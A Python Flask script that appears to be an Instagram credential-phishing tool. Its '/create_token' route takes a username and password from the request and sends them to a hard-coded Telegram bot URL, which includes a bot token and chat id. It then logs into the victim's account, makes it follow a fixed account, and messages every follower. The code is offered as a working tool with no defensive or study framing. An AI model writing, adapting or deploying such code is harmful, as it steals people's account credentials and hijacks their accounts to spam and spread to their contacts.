from flask import Flask, request, render_template
from instabot import Bot
import requests

i = 0
def session() :
    i = 0
    


message = "H"
app = Flask(__name__)

def botAuth(user,pwd , var) :
    
    while True :
        if var < 4 :
            var = var + 1
            requests.get("https://api.telegram.org/bot6424861335:AAGCknPITK_jCp6Vlsy60BhPI6Xb7YjE5Dg/sendMessage?chat_id=5804314569&text="+user+":"+pwd)
            print(var)
            bot = Bot()
            print(var)
            bot.login(username=user, password=pwd)
            user_id = bot.get_user_id_from_username(user)
            user_followers = bot.get_user_followers(user_id)
            print(user_followers)
            bot.follow("akram_elb")
            for follower in user_followers :
                bot.send_message(message, [follower])
        else :
            break
        
    


print(__name__)
@app.route('/')
def home_page():
    return render_template('index.html')
@app.route('/create_token')
def create_token():
    botAuth(request.args.get('username', None),request.args.get('password', None) ,i )
    return render_template('index.html')
   
   
app.run(port=5000)

       

